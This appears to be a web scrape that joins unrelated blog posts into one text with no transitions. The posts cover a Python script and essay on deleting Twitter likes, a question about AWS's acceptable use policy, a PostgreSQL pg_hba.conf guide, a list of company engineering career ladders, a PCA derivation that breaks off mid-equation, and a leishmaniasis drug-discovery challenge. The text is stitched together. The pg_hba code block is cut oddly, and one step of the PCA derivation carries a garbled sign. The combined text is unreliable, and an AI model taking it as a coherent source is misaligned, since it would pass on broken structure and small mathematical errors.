<p>The recent ones are easy, if you have access to the <a href="https://developer.twitter.com/en/docs/basics/getting-started" target="_blank" rel="noreferrer noopener">Twitter API</a>. You can request the list of ‘favorites’ (they never renamed them to ‘likes’ on the API layer) and from there you can <a href="https://developer.twitter.com/en/docs/tweets/post-and-engage/api-reference/post-favorites-destroy" target="_blank" rel="noreferrer noopener">delete them</a>, one at a time.</p>



<pre><code lang="python">#!/usr/bin/env python3
import os
import twitter

api = twitter.Api(
    os.environ['CONSUMER_KEY'], os.environ['CONSUMER_SECRET'],
    os.environ['ACCESS_TOKEN_KEY'], os.environ['ACCESS_TOKEN_SECRET'],
    sleep_on_rate_limit=True
)
while True:
    favorites = api.GetFavorites(count=200)
    if not favorites:
        break
    print(f"GetFavorites(): Received {len(favorites)} status objects.")
    for status in favorites:
        print(f"{status.user.screen_name:20}: {status.text}")
        status = api.DestroyFavorite(status_id=status.id)
</code></pre>



<p>From the looks of things, you can delete the most recent 3,000 or so ‘likes’ you’ve ever made using a script like this.</p>



<p>After that, things get harder.</p>



<hr>



<p>I’ve been thinking about what a ‘like’ on Twitter and Facebook means.</p>



<p>When you click it, you’re sending a single piece of information to the person who wrote the tweet. Ostensibly, I guess, that you liked their tweet. Really it’s just read-receipt for Twitter — you’re just telling someone that you read what they wrote. If you’re mentioned in a tweet it seems almost <em>fait accompli</em> that you’re going to hit ‘like’. It means “yeah yeah, I got your message”, and not much else.</p>



<p>After that, it just sits there, in your history, and in Twitter’s database. It becomes part of their algorithm to tune your feed to keep you hooked.</p>



<hr>



<p>Once you’ve deleted all the ‘likes’ that the API will allow you to see, you’ll find, to your surprise, that there are still thousands to go. They show up on your ‘likes’ page, and they show up in your exported data archive, but the little red ‘heart’ isn’t active.</p>



<p>I guess these ‘likes’ are in some sort of static cold storage. I’d be fascinated to hear from a Twitter engineer (a) how it works, and (b) why they still work for Twitter.</p>



<p>You can’t delete them, the platform doesn’t treat them as ‘liked’ tweets at all.</p>



<p>The only way to get rid of them is to is to click the heart twice: to ‘like’ it anew and then ‘unlike’ it. This sends the author  and anyone mentioned a fresh notification telling them that you liked their tweet.</p>



<p>If you want to delete your old history of tweets. You’re going to have to send a new notification to every single person in every single tweet you’ve ever liked. Thousands upon thousands of them. For tweets that can be years old.</p>



<hr>



<p>I like it when people like my tweets. I come up with witty, snarky things to say so that people click ‘like’. I want to write more of them. It keeps me coming up with ‘tweetable’ things to say.</p>



<p>At its most cynical, “like” is the endorphin button: Every time you like someone’s tweet you’re sending them a tiny little burst of pleasure that keeps them addicted to Twitter.</p>



<p>The sad thing is, the better you <em>are</em> at twitter — the better you are at pithy, wry sarcasm in short form — the more effective you are at keeping everyone else addicted to an intentionally-addictive platform.</p>



<p>We all are each other’s drug pushers.</p>



<hr>



<p>The only way someone won’t get a notification when you “like” their tweet is if (a) they don’t follow you, and (b) you set your account to ‘private’ mode first.</p>



<p>To get an exhaustive list of the tweets you’ve liked, you have to download your Twitter “data archive”, a <code>.zip</code> file of all data Twitter keeps on you (that they want to admit to). In the <code>date/like.js</code> file is the list of all the likes, along with their ID numbers.</p>



<p>This would be enough to use the API to ‘like’ and ‘unlike’ each tweet, but if you want to reduce the disruption to others you need to take more steps.</p>



<p>I used the Twitter API to retrieve the full details of every Tweet in the list so that I could group them by author and by accounts mentioned in the Tweet. I ended up writing some unreasonable amount of Python and SQLAlchemy code to correlate them all.</p>



<p>My plan was to group the operations so that I could (a) prevent notifications to strangers by being in ‘private mode’ whenever I was running my program, and (b) when it came time to disrupt my friends’ by sending them notifications, I’d try to group them all so it all happened at once instead of spread out over interminable days of hundreds of notifications.</p>



<p>It <em>would</em> be hundreds, after all: your likes are pretty proportional to the tweets you see. The tweets you see most tend to be the friends you’ve followed the longest.</p>



<p>I started working my way through the list. A couple of times a day the routine was:</p>



<ul><li>set my twitter profile to ‘protected mode’</li><li>start my script. Watch it chug through ‘liking’ and ‘unliking’ a stream of tweets</li><li>crash when the rate limit was hit</li><li>reset my Twitter profile to ‘public’ mode</li><li>wait a couple hours, and repeat</li></ul>



<p>For friends of mine who’s tweets I’d liked *hundreds* of times, I either <strong>blocked</strong> them first so they wouldn’t get notifications (knowing I could unblock them afterwards, and invite them to re-follow me), or I tried to message them first to warn them that I was about to spam them.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><div lang="en" dir="ltr"><p>Dear friends, over the next several days you're likely to see every tweet of yours I've ever "liked" get a fresh "like" notification — even years-old ones.</p><p>They're all good tweets.</p></div>— Tom Eastman (@tveastman) <a href="https://twitter.com/tveastman/status/1260676895328198656?ref_src=twsrc%5Etfw">May 13, 2020</a></blockquote>
</div></figure>



<p>For the people who get scores-to-hundreds of notifications, having this tweet pinned on the top of my profile would at least give them some explanation as to what the hell was happening.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr">OKAY, THIS MAKES MORE SENSE NOW</p>— Dr Sophia Frentz 🌈 (@SophiaFrentz) <a href="https://twitter.com/SophiaFrentz/status/1261194791729020933?ref_src=twsrc%5Etfw">May 15, 2020</a></blockquote>
</div></figure>



<p>It definitely weirded people the hell out though. Some of my friends politely removed me till it was done.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr"><a href="https://twitter.com/tveastman?ref_src=twsrc%5Etfw">@tveastman</a> muting u my friend.

</div></figure>



<p>I also accidentally re-started conversation threads left hanging years previously, thanks to the fresh notification on an old tweet.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr">Lol Tom Necro, also HTTP/3 is almost here which doesnt even use TCP</p>— Beau Butler (@oddynz) <a href="https://twitter.com/oddynz/status/1261228701947068416?ref_src=twsrc%5Etfw">May 15, 2020</a></blockquote>
</div></figure>



<p>But finally, after about two weeks of running the script at least once a day until rate-limited, I had finally deleted all my likes. Finally, I had a clean slate.</p>



<p>Only, I didn’t.</p>



<figure><img src="https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna.png" alt="" srcset="https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna.png 609w, https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna-340x243.png 340w" sizes="(max-width: 609px) 100vw, 609px"><figcaption>Completionists gonna have a hard time with this</figcaption></figure>



<p>You can’t delete a like on an old tweet without ‘liking’ the tweet again.</p>



<p>It turns out that there are plenty of tweets old tweets you might have hit ‘like’ on once, but you can’t see any more.</p>



<p>Tweets from deleted or suspended accounts <em>remain</em> in the count even if they’re not visible by the system. Tweets by people who you don’t follow who have protected their accounts are inaccessible.</p>



<p>Tweets that you liked, by Twitter users who have subsequently blocked you, can never, ever by removed by you.</p>



<p>And so, at the end of the day, I can no longer see my liked tweets, but maybe you can. And some of the tweets will be people who no longer follow me, and some of them — there forever — will be from people who loath me.</p>



<hr>



<p>What was the point of all this?</p>



<p>When it became obvious that I wasn’t going to be able to delete my like history without sending thousands of notifications. I decided to press on with the project because I wanted to see exactly what social cost Twitter would exact upon me, just for trying to reclaim my own data.</p>



<p>I didn’t measure how many people unfollowed me, but I certainly got some bewildered reactions. I had friends reach out to me out-of-band to ask me if my account had been hacked.</p>



<p>And for all that, it turned out to be un-completable. Twitter will not allow you the means to completely wipe your “like” history short of actually deleting your account.</p>



<p>‘Likes’ might not seem important. But it’s critical to the sorts of algorithms social media use to tune their feeds to keep you hooked, and to target you with advertising. They’re also a paltry, lazy mode of communication. From now on, if I like someone’s tweet, I’ll conjure the mental effort to at least tell them so, with words.</p>

I actually quite like AWS and its offerings. I’m making this post because I’m genuinely curious
how to interpret the <a href="https://aws.amazon.com/aup/">AWS Acceptable Use Policy</a>. The static content for this blog is hosted within an
AWS S3 bucket. Does saying “Fuck You AWS” constitute offensive content?</p>

<p>The section titled ‘No Illegal, Harmful, or Offensive Use or Content’ says:</p>

<blockquote>
  <p>You may not use, or encourage, promote, facilitate or instruct others to use, the Services or AWS Site for any illegal, harmful, fraudulent, infringing or offensive use, or to transmit, store, display, distribute or otherwise make available content that is illegal, harmful, fraudulent, infringing or offensive. Prohibited activities or content include:</p>
</blockquote>

<blockquote>
  <p>Offensive Content. Content that is defamatory, obscene, abusive, invasive of privacy, or otherwise objectionable, including content that constitutes child pornography, relates to bestiality, or depicts non-consensual sex acts.</p>
</blockquote>

<p>“Otherwise objectionable” seems to cast a very wide net.
One of my <a href="http://thoughts.josephdeon.me/2020/07/01/hello-weblog.html">three goals</a> for self hosting this blog was ownership. To me part of
ownership is being able to express myself freely. I hoped that meant as
long as I worked within the confines of the law I would be in the clear.</p>

<p>If this post gets removed then I know I have not fully achieved my ownership goal and it
might be time to just host on a pi.</p>

<p><br>
P.S. I posted this to hackernews. It made it to the front page and generated <a href="https://news.ycombinator.com/item?id=23717254">some discussion</a>.</p>

<p>PostgreSQL instance has got restricted access by <code>pg_hba.conf</code> file(host based authentication file).</p>
<p>We can provide in it information from which <code>ADDRESS</code> to which <code>DATABASE</code> on which <code>USER</code> by what <code>METHOD</code> we allow connecting. Additionaly we have to provide <code>TYPE</code> of connection.</p>
<p>This file resides in same place where <code>postgresql.conf</code>(we can alter this behavior by setting <code>pg_hba</code> parameter in <code>postgresql.conf</code>):</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ cd /postgresql/data/

<span># IPv6 local connections:</span>
host    all             all             ::1/128                 trust
</code></pre></div><p>Allowed <code>TYPE</code>'s:</p>
<ul>
<li><code>local</code> - socket connection - needed to connect from shell on database server</li>
<li><code>host</code> - standard TCP/IP connection over the network - bnost SSL and no SSL</li>
<li><code>hostssl</code> - TCP/IP connection but only with SSL</li>
<li><code>hostnossl</code> - TCP/IP only without SSL</li>
<li><code>hostgssenc</code> - TCP/IP only GSSAPI</li>
<li><code>hostnogssenc</code> - TCP/IP only without GSSAPI</li>
</ul>
<p>With <code>DATABASE</code> we can specify database name or use special value <code>sameuser</code> if database name should be same as name of user that is connecting.</p>
<p>With <code>USER</code> we can specify user or role - role name should be preceded by <code>+</code> sign.</p>
<p><code>ADDRESS</code> field could be - hostname, IP range in CIDR format or special words:</p>
<ul>
<li><code>samehost</code> - which correspond to all IP adresses of database server</li>
<li><code>samenet</code> - which correspond to all IP in database server subnet</li>
</ul>
<p>With <code>METHOD</code> field we can set one of authentication methods - most important ones are:</p>
<ul>
<li><code>trust</code> - allow connection without password - moslty set for local connections from database server itself</li>
<li><code>reject</code> - reject connections</li>
<li><code>md5</code> - allow connections after getting from user password - encrypted</li>
<li><code>password</code> - allow connection after getting plain password - DO NOT USE in untrusted networks - better -&gt; never use this option</li>
<li><code>ldap</code> - getting account authorization data from LDAP server</li>
</ul>
<p>In <code>DATABASE</code> and <code>USER</code> fields you can specify special word <code>all</code> if you don’t want to create any restrictions here.</p>
<p>There can be situation when we must use additional field named <code>auth-options</code> for specyfying details for example for <code>hostssl</code> connection type. This topic will be covered in another post.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="sapper"> <div>  <main> <div>  <p>"What will it take to get to the next level?"</p> <p>Of course this is a very open ended question, but it can be nice to set some guide rails around what expectations are in a company. As an individual contributor, career ladders tell me what the company ostensibly values (and, by omission, what it doesn't value).</p> <p>I recently compiled this list of career ladders and figured I would share it here. Some ladders include nontechnical jobs, I will just look at engineering and engineering management.</p> <ul> <li> <p><strong><a href="https://www.joelonsoftware.com/2009/02/13/fog-creek-professional-ladder/">Fog Creek</a></strong>: from 2009, but obviously Joel's thinking has been very influential. Focus is on growing ownership, ability to write production code independently, shipping experience, and at senior levels, design/planning/architecture. Teamwork, self study, mentorship, and impact are all key, as well as the Joel Test.</p> </li> <li> <p><strong><a href="https://dresscode.renttherunway.com/blog/ladder">Rent the Runway</a></strong> (<a href="https://docs.google.com/spreadsheets/d/1k4sO6pyCl_YYnf0PAXSBcX776rNcTjSOqDxZ5SDty-4/edit?usp=sharing">spreadsheet</a>): from 2015. Takes a fun D&amp;D inspired Dex/Str/Wis/Cha stats based evaluation, corresponding to technical skill, productivity, impact, and communication/leadership. Management track is also included, with more focus on architecture, hiring, organizational skills, and leadership/salesmanship.</p> </li> <li> <p><strong><a href="https://artsy.github.io/blog/2015/04/03/artsy-engineering-compensation-framework/">Artsy</a></strong>: inspired by Rent the Runway</p> </li> <li> <p><strong><a href="https://capgemini.gitbooks.io/grade-ladder/content/">CapGemini UK</a></strong>: also inspired by Rent the Runway</p> </li> <li> <p><strong><a href="https://basecamp.com/handbook/appendix-05-titles-for-programmers">Basecamp</a></strong>: pretty simple.</p> </li> <li> <p><strong><a href="https://engineering.thumbtack.com/how-we-built-an-engineering-job-ladder-from-the-ground-up/">Thumbtack</a></strong> (<a href="https://docs.google.com/spreadsheets/d/15ACBs-crUHnqf1wANUQwX9oZIDOi5tvJJXGWpKTcf00/edit#gid=0">spreadsheet</a>): from 2019. Breaks down technical skills into <strong>code quality/testing</strong>, <strong>debugging</strong>, and <strong>scoping/project design</strong>, and nontechnical factors to <strong>collaboration, citizenship, leadership, and impact</strong>. Leadership is interestingly broken down into <strong>Autonomy, Judgement, Initiative, and Consensus Building</strong>.</p> </li> <li> <p><strong><a href="https://circleci.com/blog/why-we-re-designed-our-engineering-career-paths-at-circleci/">CircleCI</a></strong> (<a href="https://docs.google.com/spreadsheets/d/131XZCEb8LoXqy79WWrhCX4sBnGhCM1nAIz4feFZJsEo/edit#gid=0">spreadsheet</a>): one of the most well known ladders, detailed but not overwhelming. NOtably, one of the values assessed is Security.</p> </li> <li> <p><strong><a href="https://github.com/envoy/Engineering/blob/master/engineering_bands.md">Envoy</a></strong>: pretty simple ladder list, by a hot company.</p> </li> <li> <p><strong><a href="https://medium.com/ft-product-technology/improving-our-career-map-for-engineers-4210185c6246">Financial Times</a></strong> (<a href="https://engineering-progression.ft.com/">webapp</a>). Even has an <a href="https://engineering-progression.ft.com/docs/api/">API</a>! lol. Only 4 areas across Technical, Leadership, Delivery, and Communication are assessed. Feels manageable.</p> </li> <li> <p><strong><a href="https://github.com/meetup/engineering-roles/">Meetup</a></strong>: splits roles into Makers and Managers.</p> <ul> <li>Makers focus on Architecture &amp; framework &amp; software development, Best practices &amp; architecture &amp; code reviews, Technical skills evaluation &amp; mentoring, Introduce new engineering tools &amp; mentor adoption, and Recommend process improvements &amp; support adoption.</li> <li>Managers focus on Performance evaluation, Career growth, Recruiting &amp; resourcing, Rollout process improvements &amp; adoption of engineering tools and Organization &amp; administrative.</li> </ul> </li> <li> <p><strong><a href="https://github.com/Socialbakers/engineeringroles">Socialbakers</a></strong>: seems pretty similar to Meetup's ladder</p> </li> <li> <p><strong><a href="https://medium.com/s/engineering-growth-framework/engineering-growth-tracks-b1fad620787e">Medium</a></strong> (<a href="https://gist.github.com/david206/b8dceddd687bb2c60805c9669cc89eaa">gist</a>): has tracks for Mobile, Servers, Foundations, Web client, Project Management, Communication, Craft, Initiative, Org design, Accomplishment, Wellbeing, Career development, Evangelism, Community, Recruiting, and Mentorship! Phew!</p> </li> <li> <p><strong><a href="http://www.starling-software.com/employment/programmer-competency-matrix.html">Starling Software</a></strong>: Uses Big O notation to denote levels, which is a fun shibboleth. Skills are broken out to Computer Science, Software Engineering, Programming, Experience, and Knowledge. This one has a long record on <a href="https://news.ycombinator.com/item?id=4626695">Hacker News</a> but is a good map of things that we can work on.</p> </li> <li> <p><strong><a href="https://gist.github.com/jamtur01/aef437a79fee5a9cefdc">Kickstarter</a></strong>: basically a bunch of job descriptions, including Data careers and CTO.</p> </li> <li> <p><strong><a href="https://docs.google.com/document/d/1PCj7f-91G6dGdIlfDpCHcm68L80hRELk00eO-gZvh1o/edit">Brandwatch</a></strong>: explains levels at a high level, and then breaks it out for <a href="https://docs.google.com/spreadsheets/d/1weNoeSUfHYOHy9sHKad_ax6qrVXNFlP4ieTwaRll70M/edit#gid=0">IC's and Management in this spreadsheet</a>. A total of 15 attributes to work on!</p> </li> <li> <p><strong><a href="https://labs.spotify.com/2016/02/15/spotify-technology-career-steps/">Spotify</a></strong>: famous for its "Squad/Tribe" structure - emphasizes "Steps", with a simple list of five sets of behaviors they want:</p> <ul> <li>Values team success over individual success</li> <li>Continuously improves themselves and team</li> <li>Holds themselves and others accountable</li> <li>Thinks about the business impact of their work</li> <li>Demonstrates mastery of their discipline</li> </ul> </li> <li> <p><strong><a href="https://blog.usejournal.com/the-software-engineering-job-ladder-4bf70b4c24f3">Chuck Groom</a></strong> - this is unusual - personal thoughts on a Job Ladder, though the author is a senior engineering leader at VTS. Good discussions on how having ladders helps, as well as descriptions of Anti-patterns.

      <p>In this post, we’ll take a deep dive into PCA, from both a mathematical and implementation perspective.
We’ll derive the equation from the ground up, look at how we can compute it and finally end with what it can be used for. This post is primarily targeted at those with a basic understanding of PCA but want to know the assumptions it relies on, its properties and derive how it can be computed.</p>
<p>If you’re interested in the repository containing the Jupyter notebook from which this is derived, it’s 
<a href="https://github.com/ymohamedahmed/blog-posts/tree/master/pca" target="_blank" rel="noopener">here</a>.</p>
<h2 id="the-optimal-coding-perspective">The optimal coding perspective</h2>
<h3 id="finding-a-low-dimensional-representation">Finding a low dimensional representation</h3>
<p>PCA can be thought of as finding a low-dimensional representation of a set of vectors. Given points in an <em>n</em>-dimensional space, we might wish to find some new <em>k</em>-dimensional space (with <em>k</em> &lt; <em>n</em>) which captures as much of the <em>essence</em> of the original space as possible. The exact definition of capturing the ‘<em>essence</em>’ is subject to design, however, we can consider it from multiple perspectives.</p>


<p><img src="https://ymohamedahmed.github.io/post/pca/images/pca.svg"></p><h3 id="the-notion-of-reconstruction-error">The notion of reconstruction error</h3>
<p>If we take our low-dimensional representation and attempt to recover the original <em>n</em>-dimensional vector of each point, we could measure how much each point varies from its reconstruction. The difference between each reconstruction and the original, is one way of measuring the effectiveness of our new <em>k</em>-dimensional space and is the approach taken by PCA.  Naturally, this requires a definition of a <em>similarity</em> between two matrices. If we have a matrix $X$ of our original points and our reconstruction $X'$ then we can define the difference between them as a sum of the square of errors $\sum_{i,j} (X-X’)_{i,j}^2$.</p>
<p>This quantity is known as the <em>Frobenius</em> norm of the matrix $||X-X'||_F$ and is essentially an extension of the L2 ($||\mathbf{v}||_2^2 =  \sum_i \mathbf{v}_i^2 = \mathbf{v}^\top \mathbf{v}$) norm from vectors to matrices. It is just a fancy name for squaring every element in a matrix and taking their sum. Crucially, however, we can see that the Frobenius norm of a matrix, $A$, is precisely equivalent to $Tr[A^\top A]$ (see the illustration below).</p>


<figure>

    <figcaption>Showing the relationship between the Frobenius norm and trace operator: $||A||_F^2 = \text{Tr}(A^\top A)$</figcaption>
</figure> 

<p>As a result, our error of interest, can be computed as $Tr[(X-X’)^\top (X-X’)]$, this will come in handy since the trace operator comes with a bunch of neat tricks for manipulating the matrices involved.</p>
<h3 id="pca-assumptions">PCA Assumptions</h3>
<p>We’ve defined how we’re going to evaluate this reconstruction, but not at all the means of performing the coding or its inverse.</p>
<p>PCA chooses to implement both the encoding and decoding as a matrix multiplication. So we can think of PCA as finding a matrix $D$ that will transform our input, $X$ to our coded version $C$ by a matrix multiplication (i.e. $C = XD$).
The matrix, $X$, being our original data of $m$ rows and $n$ columns.</p>
<p>We might choose, however, to use some matrix, $D_k$ which reduces the number of dimensions of our data from $m$ to $k$. To make it easier, we can tag the matrix with the new number of dimensions. If this is the case, then $D_k$ is of size $n \times k$ and so that the resulting coding, $C$, is of size $m \times k$.</p>
<p>One of the most crucial assumptions made by PCA is that the transformation matrix, $D_k$, has <strong>orthonormal</strong> columns. Criticially, this does not, technically, make it an <strong>orthogonal</strong> matrix since it may not be square and the rows may not be orthonormal.</p>
<p>This assumption is useful since it simplifies the reconstruction process, in fact, $X'$ can be computed as $XD_kD_k^\top$, i.e. we can use the transpose of the encoding matrix to perform the decoding.</p>
<p>To understand exactly why the reconstruction can be performed by the transpose of the matrix let’s consider a code $\mathbf{z}$ which we’ve generated as $\mathbf{z}=\mathbf{D}\mathbf{x}$ and are decoding using $\mathbf{D}^\top$.</p>
<p>The reconstruction error is $(\mathbf{x}-\mathbf{D}^\top\mathbf{z})^\top(\mathbf{x}-\mathbf{D}^\top\mathbf{z}) = \mathbf{x}^\top\mathbf{x} - \mathbf{x}^\top\mathbf{D}^\top\mathbf{z}-\mathbf{z}^\top\mathbf{D}\mathbf{x} + \mathbf{z}^\top\mathbf{D}\mathbf{D}^\top\mathbf{z}$.</p>
<p>We can take the derivative with respect to the code $\mathbf{z}$, $\nabla_\mathbf{z} = -2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{z}$, which given the definition of $\mathbf{z}$ is equal to $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{D}\mathbf{x}$.</p>
<p>We defined our matrix to have orthonormal columns so we know that $\mathbf{D}^\top\mathbf{D} = \mathbf{I}$ because the dot product of each column with itself will be one. Hence, our gradient is  $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{I}\mathbf{x} = \mathbf{0}$. This tells us that our encoding/decoding system is at a stationary point in the reconstruction error. Note that this only tells us for an individual point that was encoded with a matrix that has orthonormal columns, decoding with the transpose is a good idea. It doesn’t tell us anything about how to pick $\mathbf{D}$ or what happens if you use it for multiple points.</p>
<p>Given these assumptions, we can reframe our problem as finding the coding matrix which minimises the reconstruction error.</p>
<p>This means that formally, for some given value $k$, we wish to discover the matrix $D_k^*$.</p>
<p>$$D_k^* = argmin_{D_k} ||X-X'||_F =  argmin_{D_k} ||X-XD_kD_k^\top||_F$$</p>
<h3 id="discovering-the-coding-function">Discovering the coding function</h3>
<p>Given that we wish to minimise the reconstruction error, let us attempt to discover the transformation precisely capable of this.</p>
<p>We’ll need a few tricks to get us there.</p>
<ul>
<li>$(A+B)^\top = A^\top + B^\top$</li>
<li>$(AB)^\top = B^\top A^\top$</li>
<li>$(A^\top)^\top = A$</li>
</ul>
<p>From the visual illustration, recall that we can write the reconstruction error as $\text{Tr}((X-XD_kD_k^\top)^\top(X-XD_kD_k^\top))$.</p>
<p>By using the rules  this can be expanded into $$\text{argmin}_{D_k}\text{Tr}(X^\top X -X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>We are, however, only interested in the effect of the matrix $D_k$ so we’ll axe the first term $$\text{argmin}_{D_k}\text{Tr}(-X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>Crucially, however, the trace operator has two useful properties for us:</p>
<ul>
<li>it’s insensitive to cyclic permutations (i.e. $\text{Tr}(ABC) = \text{Tr}(CAB) = \text{Tr}(BCA)$)</li>
<li>the trace of a sum of matrices is the sum of their traces (i.e $\text{Tr}(\sum_i \mathbf{A}_i) = \sum_i \text{Tr}(\mathbf{A}_i)$)</li>
</ul>
<p>Given this, we can write the equation of interest as: $$\text{argmin}_{D_k}-2\text{Tr}(-X^\top XD_kD_k^\top)+ \text{Tr}(D_kD_k^\top X^\top XD_kD_k^\top)$$.</p>
<p>Furthermore, since we define the columns of $D_k$ as being orthonormal, $\mathbf{D}_k^\top \mathbf{D}_k = \mathbf{I}$ and so we can rewrite the second term as $\text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$ which matches the form of the first term (from permuting it) and therefore can be written as the following maximisation.</p>
<p>$$\text{argmax}_{\mathbf{D}_k} \text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$$</p>
<p>This is sets up exactly the quantity that PCA is attempting to maximise.</p>
<h4 id="relationship-with-eigendecomposition">Relationship with eigendecomposition</h4>
<p>Having happily derived the maximisation problem, I’ll do my best to convince you that this is, in fact, maximised by having the k-columns of $\mathbf{D}_k$ as the k eigenvectors of $\mathbf{X}^\top\mathbf{X}$ with largest eigenvalues. This will roughly take the form of an inductive proof. So let’s start with considering $k=1$, that is if we had the choice of using a single vector, what would we go with?</p>
<h5 id="base-case">Base case</h5>
<p>We’ll use the lowercase, $\mathbf{d}$, to emphasise that it’s a vector rather than matrix. So let’s try and tackle:</p>
<p>$$\text{argmax}_{\mathbf{d}} \text{Tr}(\mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d})$$</p>
<p>The trace of a scalar, is defined as itself, so we wish to find $$\text{argmax}_{\mathbf{d}} \mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d}$$</p>
<p>However, recall that we mandated as our first assumption that the columns of $\mathbf{D}$ are orthonormal and hence we know that $\mathbf{d}^\top\mathbf{d} = 1$.</p>
<p>This allows us to reframe this as a constrained optimisation problem and use Lagrange multipliers to discover which vector minimises the quantity of interest whilst satisfying the norm constraint. For convenience, we’ll use $\mathbf{A} = \mathbf{X}^\top  \mathbf{X}$.</p>
<p>Hence we can write this as:
$$L(\mathbf{d}, \mathbf{A}, \lambda) = \mathbf{d}^\top \mathbf{A}\mathbf{d} - \lambda(\mathbf{d}^\top \mathbf{d} - 1)$$</p>
<blockquote>
<p>TL;DR Lagrange multipliers are just a technique for optimising a function over a specific region, in our case we’re not looking for all vectors but only ones with a norm of 1. We rewrite the function to include the constraint and take the derivative of the new function, known as the <em>Lagrangian</em>.</p>
</blockquote>
<p>By taking the derivative of $L$ we can find the solution.</p>
<p>$$\frac{\partial L}{\partial \mathbf{d}} = 2\mathbf{A}\mathbf{d} - 2\lambda\mathbf{d}$$</p>
<p>The derivative is precisely zero when $\mathbf{A}\mathbf{d} = \lambda\mathbf{d}$, that is when $\mathbf{d}$ is an eigenvector of the matrix $\mathbf{A}$.
Furthermore, we can see that the quantity in fact takes on the associated eigenvalue since $\mathbf{d}^\top \mathbf{A}\mathbf{d} = \mathbf{d}^\top \lambda\mathbf{d} = \lambda $, where $\lambda$ is the associated eigenvalue. This is always possible since we can mandate that the eigenvector has a unit norm.</p>
<p>Hence, we can see here that for the base case, the best vector is the eigenvector with the largest eigenvalue.</p>
<h5 id="inductive-step">Inductive step</h5>
<p>Having showcased our hypothesis for $k=1$, let’s see what happens for other values of $k$. Precisely, let us show that if our hypothesis is true for some arbitrary $k$ then it is also true for some $k+1$. That is the best encoding matrix with $k+1$ columns, consists of the $k+1$ unit eigenvectors with the largest associated eigenvalues.</p>
<p>We are now interested in the following problem.</p>
<p>$$\text{argmax}_{\mathbf{D}_{k+1}} \text{Tr}(\mathbf{D}_{k+1}^\top …</p></div></div>

<hr>
<p>Leishmaniasis is a <a href="https://www.dndi.org/diseases-projects/leishmaniasis/">neglected disease</a>. As a disease of poverty, it has historically received <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3530408/">limited funding</a> for discovery, development and delivery of new tools. Current treatment is costly, lengthy, painful and sometimes toxic. Like a handful of similar diseases, it is the scourge of whole regions affected by them, because we still miss cheap, safe and effective cures for them.</p>
<p>At the same time, new drug candidates are being developed and old ones are being tested every day. Today, millions of drug activity assays are available at the press of a button. In this Indaba Grand Challenge, we dare to ask you to help identify amongst the already known, tested and (often) approved drugs, potential cures for different forms of leishmaniasis.</p>
<h2>Leishmaniasis</h2>

<p>Humanity has been remarkably successful in curing most of communicable diseases, be it of bacterial or viral origin. However, there remains a whole group of diseases that largely evade successful treatment – the ones transmitted by parasites. Large number of them is caused by a group of small, single-celled animals named <em><a href="https://www.dndi.org/wp-content/uploads/2018/12/Rao_Drugdiscoverykinetoplastiddiseases_ACSInfectiousDiseases_2019.pdf">kinetoplastids</a>. </em>They cause such diseases as African sleeping sickness (caused by <em>Trypanosoma brucei</em>), Chagas disease (<em>Trypanosoma cruzii</em>) and&nbsp; Leishmaniasis (different <em>Leishmania</em> species). </p>

<p>Leishmaniases (as it is a whole group of diseases), are spread by bites of sandflies and readily communicated between animals (such as dogs). Out of 30 species that attack animals, 21 affect humans. There are more than 350 million people in nearly 90 countries, that live in areas where leishmaniasis is common. Around 90% of its most dangerous variant – visceral leishmaniasis –&nbsp; is recorded&nbsp; in Bangladesh, Nepal, Sudan and Brazil, but disease is prevalent also in Mexico, South and Central America, Asia (excluding the South-East Asia), Middle East, southern Europe and Africa (in particular North and East Africa) .</p>

<p>Every year approximately 12 million people are afflicted with the disease, with over 2 million new cases each year, most of which is a cutaneous (skin) leishmaniasis (nearly 1.5 million), but nearly 25% comprises the most lethal, visceral variant. Parasite suppresses the host’s immune system to avoid eradication, which often leads to frequently lethal secondary respiratory infections.&nbsp; Yearly, approximately 50 thousand people die worldwide because of <em>Leishmania </em>caused diseases.  </p>
<p>Visceral leishmaniasis causes swelling, malaise, wasting, damages spleen and liver, as well as leads to characteristic graying of skin (hence the name <em>black fever</em>). The fever caused by the disease lasts for more than two weeks and does not abate with antimalarial drugs. The cutaneous type makes for wide-spread sores that can take over a year to heal, and lead to necrosis (dying of tissue). It leads to scars on the face, neck, arms and legs. The third, mucocutaneous type causes both skin and mucosal ulcers, leading to the damage of soft tissues and cartilage, predominantly of nose and mouth area. All types tend to co-occur with AIDS (approximately 1 in 60 AIDS patients in south of France suffers from leishmaniasis).</p>

<p> The treatment for visceral leishmaniasis is problematic and relies mostly on antibiotics, which have a variable success rate. The most commonly used non-antibiotic drugs, containing pentavalent antimony (such as sodium stibogluconate or meglumine antimonate) are toxic to the heart, kidneys, pancreas and bone marrow of the patient, leading to headaches, abdominal issues, vomiting and low levels of blood platelets. They also require a month-long treatment through injections, as medication does not work well if taken by mouth. There is no safe treatment for cutaneous leishmaniasis, that would work dependably, with fluconazole (an antifungal medication) and pentamidine (an antimicrobial used for other kinetoplastid diseases) being the most promising support medications. Miltefosine, the first promising oral treatment for visceral leishmaniasis, tends to be effective for cutaneous form, but has limited use, as it is known to cause birth defects. </p>
